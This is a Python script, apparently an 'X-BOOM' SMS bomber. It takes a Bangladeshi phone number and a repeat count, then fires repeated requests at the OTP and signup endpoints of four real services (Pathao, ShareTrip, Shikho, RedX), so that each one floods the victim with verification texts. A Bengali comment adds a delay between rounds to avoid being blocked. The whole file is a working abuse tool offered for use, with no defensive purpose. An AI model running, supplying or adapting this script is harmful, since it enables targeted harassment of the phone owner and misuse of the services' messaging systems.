import requests, os, time

def start():
    os.system('clear')
    print('\033[1;32m[ X-BOOM VIP EDITION - OWN REPO ]\033[0m')
    target = input('\n\033[1;32m[+] TARGET (017...): \033[0m')
    amount = int(input('\033[1;32m[+] AMOUNT: \033[0m'))
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }

    for i in range(1, amount + 1):
        try:
            # ১. Pathao API
            requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, headers=headers)
            
            # ২. ShareTrip API
            requests.post("https://api.sharetrip.net/api/v1/otp/send", json={"mobileNumber": target, "type": "login"}, headers=headers)
            
            # ৩. Shikho API
            requests.post("https://api.shikho.com/api/v1/auth/send-otp", json={"phone": target, "type": "login"}, headers=headers)
            
            # ৪. RedX API
            requests.post("https://api.redx.com.bd/v1/user/signup", json={"phone": target}, headers=headers)

            print(f'\033[1;32m[{i}] SUCCESS SENT ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] FAILED SENT\033[0m')
        
        # ব্লকিং এড়াতে ১০ সেকেন্ড গ্যাপ দিন
        time.sleep(10)

if __name__ == "__main__":
    start()
